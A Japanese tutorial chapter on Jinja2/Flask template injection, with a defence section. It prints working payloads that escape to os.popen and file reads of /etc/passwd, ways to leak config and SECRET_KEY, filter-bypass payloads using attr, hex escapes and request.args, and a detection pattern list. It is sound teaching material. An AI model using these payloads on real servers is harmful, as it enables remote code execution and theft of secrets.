## Jinja2/Flaskのサンドボックス脱出とフィルタ回避

Python の Web フレームワーク Flask が標準採用するテンプレートエンジン **Jinja2** は、SSTI（Server-Side Template Injection：サーバ側テンプレート差し込み）の題材として最もよく研究されている実装である。本節では「なぜテンプレート式の中から OS コマンド実行（RCE）まで到達できてしまうのか」を Python の言語仕様レベルで解き明かし、あわせて防御側が知っておくべきフィルタ回避（ブラックリスト回避）の手口を整理する。

本書のスコープに従い、記述はすべて**防御目的**である。実在サービスや本番環境への無許可検証、破壊的コマンド（データ破壊・逆シェル一発起動など）の手順書は示さない。以降のペイロードは、原理説明のために `id` や `ls` といった無害な確認コマンドを用い、影響の大きさは概念として述べる。

### 用語の整理 — sink と「サンドボックス脱出」

- **sink（シンク）**: ユーザ入力が最終的に実行・解釈される危険な代入先。SSTI では「テンプレートエンジンに文字列として渡され、式として評価される箇所」が sink になる。たとえば `render_template_string("Hello " + name)` の `name` はまさに sink である。
- **サンドボックス脱出（sandbox escape）**: Jinja2 は `SandboxedEnvironment` という制限モードを持ち、危険な属性アクセス（`__globals__` など）を遮断できる。だが多くの Flask アプリは**そもそもサンドボックスを使っていない**（`render_template_string` は非サンドボックス環境）。攻撃の本質は「テンプレートの限られた式構文だけを起点に、通常の Python 実行フローへ戻る道を見つけること」である。HackTricks はこれを *"find a way to escape from the sandbox and recover access the regular python execution flow"* と表現している。

### 検出 — Jinja2 かどうかを見分ける

SSTI かどうか、そしてエンジンが Jinja2 かを最小限の入力で判定する。

```text
{{7*7}}    → 49        （テンプレートとして評価された証拠）
{{7*'7'}}  → 7777777   （Jinja2/Python のセマンティクス。Twig なら 49 になる）
```

`{{7*7}}` が `49` に化ければ「式が評価されている＝SSTI」が確定する。ここで `{{7*'7'}}` を追加で送ると、**文字列 × 整数が文字列反復になる**という Python 特有の挙動（`'7'*7 == '7777777'`）が現れる。Twig（PHP）は同じ式を数値 `49` にするため、この 1 発でエンジンを Jinja2 側に絞り込める。R3d Buck3T の記事では、まず `${{<%[%'"}}%\` のような**多言語フズ文字列**を撃ち込み、どの記号がエラーを起こし・どれが解釈されるかを観察してエンジンを推定する手順が示されている。

> 出典: pequalsnp-team — Cheatsheet: Flask & Jinja2 SSTI — https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
> 出典: R3d Buck3T (Nairuz Abulhul) — RCE with Server-Side Template Injection — https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e

### 常に到達できるグローバルオブジェクト

Jinja2 テンプレート内では、以下のオブジェクトが（サンドボックスの有無に関わらず）ほぼ常に参照できる。これらが脱出の「足がかり」になる。

- リテラル: `[]`（list）, `''`（str）, `()`（tuple）, `dict`
- Flask がテンプレートに注入する変数: `config`（アプリ設定）, `request`（HTTP リクエスト）, `session`, `g`（リクエストローカルなグローバル記憶域）
- Jinja2 標準のグローバル関数: `lipsum`, `cycler`, `joiner`, `namespace`, および Flask の `url_for`, `get_flashed_messages`

これらは「ただのデータ」に見えるが、Python では**すべてがオブジェクトであり、オブジェクトは自分のクラス・継承ツリー・所属モジュールの名前空間へ辿るリンクを内部に持っている**。この参照リンクこそが脱出経路になる。

### 核心① オブジェクトクラスチェーン（MRO と `__subclasses__`）

脱出の王道は、任意のオブジェクトから **`<class 'object'>`（Python 全クラスの共通の祖先）** に登り、そこから「現在ロードされている全クラスの一覧」を取得して、危険なクラス（ファイル操作・`subprocess` など）を選び出す、という流れである。

登るために使う属性・メソッドの意味を押さえておく。

- `__class__`: そのインスタンスのクラスを返す（例: `''.__class__` → `<class 'str'>`）。
- `__base__` / `__mro__` / `mro()`: クラスの継承関係。`__mro__`（Method Resolution Order：メソッド解決順序）は、そのクラスがメソッドを探索する親クラスの並び。`object` は必ず末尾（`[-1]`）に来る。
- `__subclasses__()`: `object` に対して呼ぶと、**そのインタプリタに現在ロードされている object の直接サブクラス一覧**（数百〜千個）を返す。

```text
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
```

**なぜ動くのか**: どのリテラル（`dict`, `()`, `[]`）から出発しても、`__base__`（1 段上）または `__mro__[-1]`／`mro()[-1]`（一気に最上位）で必ず `object` に到達する。`object` は全クラスの親なので、`__subclasses__()` はインタプリタが読み込んだクラスをほぼ網羅列挙する。ここに `subprocess.Popen` や各種ファイル系クラスが混じっているため、あとは**目的のクラスを配列インデックスで拾う**だけでよい。

配列のインデックスは Python バージョン・ロード済みモジュール・アプリ構成で変動する点に注意（同じ CTF 環境でも版が違えばズレる）。R3d Buck3T の事例では `{{ "".__class__.__mro__[1].__subclasses__() }}` が **784 個**のクラスを返し、その中の `subprocess.Popen` が**インデックス `[407]`**にあった。HackTricks は `subprocess.Popen` が概ね `[396]` 付近、ファイル系クラスが `[40]` 付近という「よくある値」を挙げるが、これらは**環境依存の目安**であって固定値ではない。

#### ファイル読み書き

`object` のサブクラス群からファイルクラス（旧 Python 2 の `file` 相当や、`io` 系）を選ぶと、任意ファイルの読み書きに使える。

```text
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

`__mro__[1]` は str の直近の親（≒ object）で、そこから列挙したサブクラスのうちファイルを開けるものを 1 つ選び、`/etc/passwd` を開いて `.read()` している。これはローカルファイル読み取り（機密設定・鍵・ソース漏えい）に直結する。

#### インデックスに依存しない RCE（`warning` ループ）

環境ごとにズレるインデックスをハードコードするのを避けるため、**クラス名で探す**手法がよく使われる。

```text
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen("id").read() }}
  {% endif %}
{% endfor %}
```

**なぜ `warning` を狙うのか**: `warnings.catch_warnings` クラスは、そのインスタンスの `_module` 経由で `warnings` モジュールの `__builtins__`（組み込み名前空間）に辿れる。`__builtins__` には `__import__` があり、これで `os` を読み込み、`os.popen('id').read()` でコマンド実行できる。インデックス番号ではなくクラス名 `"warning"` で選ぶため、**版差に強い**のが利点である。上のループは列挙 → 名前一致 → 到達をワンショットで書いたテンプレート文である。

> 出典: HackTricks — Jinja2 SSTI（GitHub 原本ミラーより取得）— https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
> 出典: pequalsnp-team — Cheatsheet: Flask & Jinja2 SSTI — https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

⚠️ **未取得の資料**: 「HackTricks: Jinja2 SSTI」の正規ページ（hacktricks.wiki）は自動取得できませんでした（理由: 302 リダイレクト先の tollbit プロキシが `402 Payment Required` を返したため）。上記は**同一内容の GitHub 原本（HackTricks-wiki/hacktricks）の raw を取得**したもので実質内容は網羅できています。原文は次からご覧ください: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html

### 核心② `__globals__` 経由の脱出（object を経由しない道）

`__subclasses__()` を使わず、**関数オブジェクトが持つ `__globals__`**（その関数が定義されたモジュールのグローバル名前空間）から一気に組み込みへ抜ける道もある。こちらの方が短く安定することが多い。

```text
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("id").read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**なぜ動くのか**: Python の関数は、自分が定義されたモジュールの**モジュールグローバル辞書**への参照を `__globals__` に持つ。`config` クラスのメソッド `from_envvar` は Flask 内部モジュールで定義されているため、その `__globals__` には Flask がインポート済みの `os` や、`__builtins__`（`__import__`・`open` を含む組み込み名前空間）が入っている。つまり「テンプレートから参照できる何らかの関数」を 1 つ見つけて `.__globals__.__builtins__` に触れれば、`__import__('os')` で自由にモジュールを引き込める。`get_flashed_messages` は Flask がデフォルトでテンプレートに公開するため、`config`/`request` が潰されていても足がかりになりやすい。

Jinja2 標準グローバルの `lipsum`・`cycler`・`joiner` も同じ原理で使える。

```text
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% print(cycler.__init__.__globals__['os'].popen('id').read()) %}
```

`lipsum`（ダミーテキスト生成関数）の `__globals__` には Jinja2 内部で import 済みの `os` がそのまま入っているため、`lipsum.__globals__['os']` が即 `os` モジュールになる。これは `config`/`request` を一切使わない経路として重要である。

### 核心③ フィルタ／ブラックリスト回避

多くの「なんちゃって対策」は、危険な文字や語（`.`、`_`、`[`、`]`、`__class__`、`config` など）を単純にブラックリストで弾く。しかし Jinja2 には**同じ意味を別の書き方で表現する手段**が豊富にあり、ブラックリストは容易に破られる。ここが本節で最も防御に効く部分である。

#### `.`（ドット）と `[]`（角括弧）を使わない — `attr` フィルタ

`request[...]` や `request....` の代わりに、Jinja2 標準の **`attr` フィルタ**で属性名を文字列として渡す。

```text
{{ request|attr("__class__") }}
```

`attr` は「文字列で指定した属性を取り出す」正規フィルタなので、`.` も `[]` も一切使わずに `__class__` へアクセスできる。ドット/角括弧のブラックリストはこれで無力化される。

#### `_`（アンダースコア）を使わない — hex エスケープと動的合成

`__class__` の `_` を書けない場合、**文字列内 hex エスケープ**や**文字結合**で `_` を実行時に作る。

```text
request|attr("\x5f\x5fclass\x5f\x5f")
request|attr(["_"*2, "class", "_"*2]|join)
```

**なぜ動くのか**: `\x5f` は文字 `_` の 16 進表記であり、**デコードは Jinja2/Python がテンプレート評価時に行う**。ブラックリストがリクエスト文字列を検査する段階ではソースに `_` が現れないため、素通りしてしまう。`["_"*2,"class","_"*2]|join` は「`_`×2 + `class` + `_`×2」を `|join` で連結し `__class__` を組み立てる方法だが、`_` そのものすら書きたくない／`|join` も禁止という段階では次の「外部入力からの持ち込み」に進む。

#### 禁止文字を外部入力から持ち込む — `request.args`/`headers`/`cookies`

ペイロード本体に禁止文字を書かず、**別のパラメータやヘッダに逃がして** `request` 経由で読み込む。

```text
?exploit={{ request|attr(request.args.param) }}&param=__class__
?exploit={{ request[request.args.param] }}&param=__class__
```

`request.args.param` は URL クエリの `param` の値（=`__class__`）を返すだけなので、テンプレート本文には危険語が現れない。フィルタが `exploit` パラメータしか検査していなければ、`param`・`request.cookies`・`request.headers`・`request.environ`・`request.values` などが**検査対象外の搬入口**になる。

#### `|join` すら禁止のとき — `|format`

`|join` を潰された場合は `|format` フィルタで `%s` 差し込みにより文字列を合成する。

```text
?c={{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}&f=%s%sclass%s%s&a=_
```

`f=%s%sclass%s%s` に `a=_` を 4 回差し込むと `__class__` が生成される。`join` を使わずに同じ結果を得るための代替手段である。

#### 文字列連結演算子 `~`

Jinja2 の `~` は文字列連結演算子で、`"__"~"class"~"__"` のように断片を繋げられる。`+` が数値加算に化ける文脈でも `~` は常に文字列連結になるため、語の再構成に使われる。

#### `{{ }}` そのものが禁止のとき — 文（statement）タグ

出力式 `{{ }}` を弾かれても、`{% ... %}` の**文タグ**で計算・出力ができる。

```text
{% set x = 7*7 %}{{ x }}
{% print(''.__class__.__mro__[1]) %}
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}YES{% endif %}
{% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() %}{{ a }}{% endwith %}
```

`{% if ... %}` を使えば、出力を一切返さない状況でも「コマンド結果に `uid=` が含まれるか」を分岐で観測する**ブラインド（真偽ベース）**の抽出ができる。`{% print(...) %}` は式の値を直接書き出す拡張的手段である。

以下は「`.`・`_`・`[]`・`|join` をすべて禁止した環境」を想定して OnSecurity・HackTricks が示す、回避を組み合わせた完全ペイロードの形（コマンドは無害な `id`）。

```text
{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")
   |attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")
   |attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")
   |attr("popen")("id")|attr("read")() %}{% print(a) %}{% endwith %}
```

`.`/`[]` は全て `|attr(...)` に、`_` は全て `\x5f` に、辞書アクセス `[...]` は `__getitem__` の呼び出しに置換されている。これ 1 つで「単純なブラックリストは設計として破綻している」ことが分かる。

> 出典: OnSecurity — Server Side Template Injection with Jinja2 — https://onsecurity.io/article/server-side-template-injection-with-jinja2/
> 出典: HackTricks — Jinja2 SSTI（GitHub 原本ミラー）— https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md

⚠️ **未取得の資料**: 「OnSecurity: Server Side Template Injection with Jinja2」の本文は自動取得できませんでした（理由: `403 Forbidden`）。上記のフィルタ回避（`attr`／`request.args` による `_` 持ち込み／`\x5f` hex エスケープ／`|join`・`|format`）は **WebSearch 経由で得た同記事の要約と、内容が一致する HackTricks 原本**から再構成しています。原文は次からご覧ください: https://onsecurity.io/article/server-side-template-injection-with-jinja2/
> （以下は未取得資料の補足として一般知識に基づく解説です）OnSecurity の記事は、PayloadsAllTheThings を下敷きに「ドット・アンダースコア・角括弧・`join` を段階的に禁止していったとき、それぞれをどの Jinja2 機能で置き換えるか」を実例で追う構成になっている。要点は本節で網羅した「`attr` フィルタ」「外部入力からの禁止文字搬入」「hex エスケープ」の 3 本柱である。

### `config` オブジェクトの悪用と情報漏えい

`config` は Flask アプリの設定辞書で、**それ自体が高価値の情報源**である。

```text
{{ config }}
{{ config.items() }}
{% for k, v in config.items() %}{{ k|e }}: {{ v|e }}{% endfor %}
```

`config.items()` は `SECRET_KEY`・DB 接続情報・環境変数など、グローバル設定を丸ごと露出させる。`SECRET_KEY` が漏れれば Flask セッション Cookie の偽造（署名の付け直し）に直結する。

さらに `config` はメソッド経由で危険な操作にも使える。R3d Buck3T の記事では、`{{ config.from_object('os') }}` で config に `os` モジュールを取り込ませてから、`config.items()` 由来のクラス参照 → `__mro__` → `__subclasses__()[index]` の順に `subprocess.Popen` へ到達している。HackTricks は `config` が潰されても、`request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config[...]` のように**別経路で `current_app.config` に回り込める**ことを示す。要は「1 つの入口を塞いでも、Python オブジェクトグラフには無数の迂回路がある」ということである。

> 出典: R3d Buck3T (Nairuz Abulhul) — RCE with Server-Side Template Injection — https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
> 出典: pequalsnp-team — Cheatsheet: Flask & Jinja2 SSTI — https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

⚠️ **未取得の資料**: 「R3d Buck3T: RCE with Server-Side Template Injection」の Medium 本文は正規 URL では自動取得できませんでした（理由: `403 Forbidden`）。上記の検出手順（`${{<%[%'"}}%\` によるフズ、`{{7*7}}`）・`get_flashed_messages.__globals__` によるファイル読み・`config.from_object('os')`・`subclasses()[407]` での `subprocess.Popen` 到達は、**Google 翻訳ミラー（medium-com.translate.goog）経由で取得した同記事の内容**に基づきます。原文は次からご覧ください: https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e

### RCE に至る全体像（まとめ）

SSTI → RCE の到達経路を俯瞰すると、次の 3 パターンに集約される。

1. **object サブクラス経由**: 任意リテラル → `__mro__[-1]`（object）→ `__subclasses__()` → `subprocess.Popen`／ファイルクラスをインデックスまたはクラス名で選択。
2. **`__globals__` 経由**: 任意の関数（`config` のメソッド、`get_flashed_messages`、`lipsum` など）→ `.__globals__.__builtins__.__import__('os')` → `os.popen(...)`。
3. **`config` 経由**: 設定の情報漏えいそのもの、または `from_object`/`from_pyfile` を絡めたモジュール読み込み。

いずれも「テンプレート式という狭い入口」から「Python の完全な実行環境」へ復帰しているだけで、Jinja2 のバグではなく**設計どおりのオブジェクト到達性**を利用している点に注意したい。破壊的な逆シェル（`mkfifo`+`nc` 型など）も原理は同じ `subprocess.Popen` 呼び出しの延長にすぎず、影響は「サーバ上での任意コマンド実行＝完全侵害」と理解すればよい。本書では実行可能な逆シェル手順は示さない。

### 防御 — サンドボックスに頼らない設計

フィルタ回避の豊富さが示すとおり、**入力ブラックリストは根本対策にならない**。防御は次の順で考える。

1. **ユーザ入力をテンプレート「ソース」に連結しない**。`render_template_string(user_input)` や `"..."+user_input` を避け、必ず**変数として**渡す（`render_template("page.html", name=user_input)`）。データとコードを分離すれば SSTI は起きない。
2. **どうしても動的テンプレートが要るなら `SandboxedEnvironment`**（できれば `ImmutableSandboxedEnvironment`）を使い、`__globals__`・`__subclasses__` 等へのアクセスを遮断する。ただしサンドボックスにも過去に脱出 CVE（例: `str.format` 悪用系）があり、**サンドボックス＝安全ではない**。多層防御の 1 枚と位置づける。
3. **最小権限化とセグメンテーション**: アプリ実行ユーザの権限縮小、`SECRET_KEY` 等の秘匿情報を環境から分離し、`config` 露出時の被害を限定する。
4. **検知**: `{{`・`__class__`・`__globals__`・`mro`・`subclasses` などのパターンや、テンプレート評価時の異常を WAF/ログで監視する（回避される前提で、あくまで検知の一助として）。

要するに、Jinja2 SSTI 対策の本丸は「**入力をテンプレート言語として解釈させない**」という一点にある。フィルタ強化は攻撃者との軍拡競争になり、本節で見たとおり最終的に破られる。
